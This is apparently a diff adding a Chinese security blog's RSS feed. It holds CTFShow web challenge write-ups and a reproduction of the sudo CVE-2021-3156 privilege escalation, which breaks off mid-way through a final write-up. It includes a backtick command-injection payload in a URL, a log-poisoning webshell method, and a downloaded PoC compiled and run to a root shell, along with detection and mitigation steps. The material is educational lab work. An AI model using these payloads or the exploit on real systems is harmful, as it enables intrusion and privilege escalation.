+&lt;h2 id=&#34;web397&#34;&gt;web397&lt;/h2&gt;
+&lt;p&gt;跟web396差不多，不同的是重定向到了/tmp文件夹，但是没有关系&lt;/p&gt;
+&lt;p&gt;直接构造payload：?url=http://username:password@`cat fl0g.php`/../../../var/www/html/a.txt&lt;/p&gt;
+&lt;p&gt;ls那个大家自己构造，flag所在文件名没变就直接拿过来用了。&lt;/p&gt;
+&lt;h2 id=&#34;web398&#34;&gt;web398&lt;/h2&gt;
+&lt;p&gt;我感觉我做的是非预期解&amp;hellip;&amp;hellip;&lt;/p&gt;
+&lt;p&gt;payload同web397。其实这题过滤的是【host】中的分号，不是很懂预期解应该是什么。&lt;/p&gt;
+&lt;h2 id=&#34;web399&#34;&gt;web399&lt;/h2&gt;
+&lt;p&gt;同上，之前看群里大佬疯狂秒题之后说用的一个payload，现在算是见识到了。&lt;/p&gt;
+&lt;h2 id=&#34;web400&#34;&gt;web400&lt;/h2&gt;
+&lt;p&gt;同上。&lt;/p&gt;
+&lt;h2 id=&#34;web401&#34;&gt;web401&lt;/h2&gt;
+&lt;p&gt;同上。&lt;/p&gt;
+&lt;h2 id=&#34;web402&#34;&gt;web402&lt;/h2&gt;
+&lt;p&gt;过滤了schema，把http改掉就行，其余同上。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CTFShow web入门459wp</title>
+        <link>https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8459wp/</link>
+        <pubDate>Sat, 06 Feb 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8459wp/</guid>
+        <description>&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8459wp/1612599038831.png&#34;
+	width=&#34;641&#34;
+	height=&#34;749&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8459wp/1612599038831_hu025be62dda6d88839f296e218e36b6cd_64315_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8459wp/1612599038831_hu025be62dda6d88839f296e218e36b6cd_64315_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612599038831&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;85&#34;
+		data-flex-basis=&#34;205px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这道题很简洁，这里用了一个&lt;a class=&#34;link&#34; href=&#34;https://www.php.net/manual/zh/function.copy.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;copy()函数&lt;/a&gt;，一开始我一直纠结在这个函数本身的性质上，翻来覆去的研究半天也看不出个所以然，这个函数的第二个参数是目标文件，如果目标文件存在则直接覆盖，但是如果不存在则会新建一个文件，这是重点，但文档上没有说明，这样就可以构造payload：?u=/var/log/nginx/access,log&amp;amp;p=a&lt;/p&gt;
+&lt;p&gt;然后直接访问a.php，你会看到copy过来的日志文件，然后就可以改UA头然后通过日志getshell，但是不要忘了，copy过来的a.php并不会产生后续变化，也就是说，你需要先改UA头注入一个&lt;!-- raw HTML omitted --&gt;，然后再去copy日志，鉴于这里已经copy过一次了，所以我们修改完UA并且发包后，重新copy一个到b.php,即?u=/var/log/nginx/access,log&amp;amp;p=b，然后利用蚁剑连上这个b.php，就可以浏览flag.php了。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CVE-2021-3156漏洞复现</title>
+        <link>https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+        <pubDate>Tue, 02 Feb 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+        <description>&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述&lt;/h2&gt;
+&lt;p&gt;1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，&lt;em&gt;&lt;strong&gt;它将在命令参数中使用反斜杠转义特殊字符&lt;/strong&gt;&lt;/em&gt;。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致&lt;em&gt;&lt;strong&gt;缓冲区溢出&lt;/strong&gt;&lt;/em&gt;。只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。&lt;/p&gt;
+&lt;h2 id=&#34;影响范围&#34;&gt;影响范围&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;sudo 1.8.2 - 1.8.31p2&lt;/li&gt;
+&lt;li&gt;sudo 1.9.0 - 1.9.5p1&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;漏洞检测&#34;&gt;漏洞检测&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;首先查看sudo版本号  &lt;code&gt;sudo --version&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1612236259494.png&#34;
+	width=&#34;334&#34;
+	height=&#34;114&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1612236259494_hu92eac2a72f385cf08bcdbcfe1ac3109f_40297_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1612236259494_hu92eac2a72f385cf08bcdbcfe1ac3109f_40297_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612236259494&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;292&#34;
+		data-flex-basis=&#34;703px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;执行sudoedit -s /命令&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;若出现以“ sudoedit: ”开头的错误，则可能存在该漏洞。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;若出现以“ usage ”开头的错误，则无该漏洞。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;复现过程&#34;&gt;复现过程&lt;/h2&gt;
+&lt;p&gt;首先创建一个非root权限用户，然后下载&lt;a class=&#34;link&#34; href=&#34;https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;POC&lt;/a&gt;。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;test@kali:/home$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; test-1/
+test@kali:~$ ls
+CVE-2021-3156_nss_poc_ubuntu.tar.gz
+test@kali:~$ tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz 
+CVE-2021-3156/
+CVE-2021-3156/hax.c
+CVE-2021-3156/lib.c
+CVE-2021-3156/Makefile
+test@kali:~$ ls
+CVE-2021-3156  CVE-2021-3156_nss_poc_ubuntu.tar.gz
+test@kali:~$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; CVE-2021-3156/
+test@kali:~/CVE-2021-3156$ ls
+hax.c  lib.c  Makefile
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;按照上面的步骤将下载下来的压缩包解压，然后进入文件夹编译程序。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;test@kali:~/CVE-2021-3156$ make
+rm -rf libnss_X
+mkdir libnss_X
+gcc -o sudo-hax-me-a-sandwich hax.c
+gcc -fPIC -shared -o &lt;span class=&#34;s1&#34;&gt;&amp;#39;libnss_X/P0P_SH3LLZ_ .so.2&amp;#39;&lt;/span&gt; lib.c
+test@kali:~/CVE-2021-3156$ ls
+hax.c  lib.c  libnss_X  Makefile  sudo-hax-me-a-sandwich
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;编译好程序之后，执行&lt;code&gt;sudo-hax-me-a-sandwich&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;test@kali:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+
+** CVE-2021-3156 PoC by blasty &amp;lt;peter@haxx.in&amp;gt;
+
+using target: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&amp;#39;&lt;/span&gt;
+** pray &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; your rootshell.. **
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; bl1ng bl1ng! We got it!
+&lt;span class=&#34;c1&#34;&gt;# whoami&lt;/span&gt;
+root
+&lt;span class=&#34;c1&#34;&gt;# id&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;test@kali:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+
+** CVE-2021-3156 PoC by blasty &amp;lt;peter@haxx.in&amp;gt;
+
+using target: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28&amp;#39;&lt;/span&gt;
+** pray &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; your rootshell.. **
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; bl1ng bl1ng! We got it!
+&lt;span class=&#34;c1&#34;&gt;# whoami&lt;/span&gt;
+root
+&lt;span class=&#34;c1&#34;&gt;# id&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可选参数貌似是0和1，不管使用哪个都能提权，显示的结果稍有不同，感兴趣的同学可以自行研究。&lt;/p&gt;
+&lt;h2 id=&#34;修补方法&#34;&gt;修补方法&lt;/h2&gt;
+&lt;p&gt;将sudo升级到安全版本&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://www.sudo.ws/download.html&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;临时修补方法&#34;&gt;临时修补方法&lt;/h2&gt;
+&lt;p&gt;对于无法立即更新的用户，建议使用systemtap进行以下临时缓解：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;安装所需的systemtap软件包和依赖项：&lt;/p&gt;
+&lt;p&gt;systemtap yum-utils kernel-devel-&amp;quot;$(uname -r)&amp;quot;&lt;/p&gt;
+&lt;p&gt;对于RHEL 7，使用命令安装 kernel debuginfo：debuginfo-install -y kernel-&amp;quot;$(uname -r)&amp;quot;。
+对于RHEL 8，使用命令安装 sudo debuginfo：debuginfo-install sudo。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;创建以下systemtap脚本（将文件命名为sudoedit-block.stap）:
+probe process(&amp;quot;/usr/bin/sudo&amp;quot;).function(&amp;ldquo;main&amp;rdquo;) {
+command = cmdline_args(0,0,&amp;quot;&amp;quot;);
+if (strpos(command, &amp;ldquo;edit&amp;rdquo;) &amp;gt;= 0) {
+raise(9);
+}
+}&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用以下命令安装脚本：（使用root权限）
+#nohup stap -g sudoedit-block.stap &amp;amp;
+该脚本将使得易受攻击的sudoedit二进制文件停止工作。sudo命令仍将照常工作。上述更改在重启后失效，必须在每次重启后重新应用。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;一旦安装了补丁程序，就可以通过取消systemtap进程来删除systemtap脚本。例如，通过使用：
+#kill -s SIGTERM 7590 (其中7590是systemtap进程的PID)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;参考链接：&lt;a class=&#34;link&#34; href=&#34;https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;EXP地址：&lt;a class=&#34;link&#34; href=&#34;https://github.com/stong/CVE-2021-3156&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/stong/CVE-2021-3156&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;POC的github地址：&lt;a class=&#34;link&#34; href=&#34;https://github.com/blasty/CVE-2021-3156&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/blasty/CVE-2021-3156&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CTFShow萌新计划web1-8</title>
+        <link>https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web1-8/</link>
+        <pubDate>Sun, 31 Jan 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web1-8/</guid>
+        <description>&lt;h2 id=&#34;web1-7&#34;&gt;web1-7&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;title&amp;gt;ctf.show萌新计划web1&amp;lt;/title&amp;gt;
+    &amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;?php
+# 包含数据库连接文件
+include(&amp;#34;config.php&amp;#34;);
+# 判断get提交的参数id是否存在
+if(isset($_GET[&amp;#39;id&amp;#39;])){
+    $id = $_GET[&amp;#39;id&amp;#39;];
+    # 判断id的值是否大于999
+    if(intval($id) &amp;gt; 999){
+        # id 大于 999 直接退出并返回错误
+        die(&amp;#34;id error&amp;#34;);
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql = &amp;#34;select * from article where id = $id order by id limit 1 &amp;#34;;
+        echo &amp;#34;执行的sql为：$sql&amp;lt;br&amp;gt;&amp;#34;;
+        # 执行sql 语句
+        $result = $conn-&amp;gt;query($sql);
+        # 判断有没有查询结果
+        if ($result-&amp;gt;num_rows &amp;gt; 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row = $result-&amp;gt;fetch_assoc()) {
+                echo &amp;#34;id: &amp;#34; . $row[&amp;#34;id&amp;#34;]. &amp;#34; - title: &amp;#34; . $row[&amp;#34;title&amp;#34;]. &amp;#34; &amp;lt;br&amp;gt;&amp;lt;hr&amp;gt;&amp;#34; . $row[&amp;#34;content&amp;#34;]. &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
+            }
+        }
+        # 关闭数据库连接
+        $conn-&amp;gt;close();
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+?&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;!-- flag in id = 1000 --&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;快速浏览一下，需要get一个id并且值为1000，需要绕过的点是intval()函数。&lt;/p&gt;
+&lt;p&gt;我们来看一下&lt;a class=&#34;link&#34; href=&#34;https://www.php.net/manual/zh/function.intval.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;php Manual&lt;/a&gt;的实例：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                      &lt;span class=&#34;c1&#34;&gt;// 42
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;4.2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                     &lt;span class=&#34;c1&#34;&gt;// 4
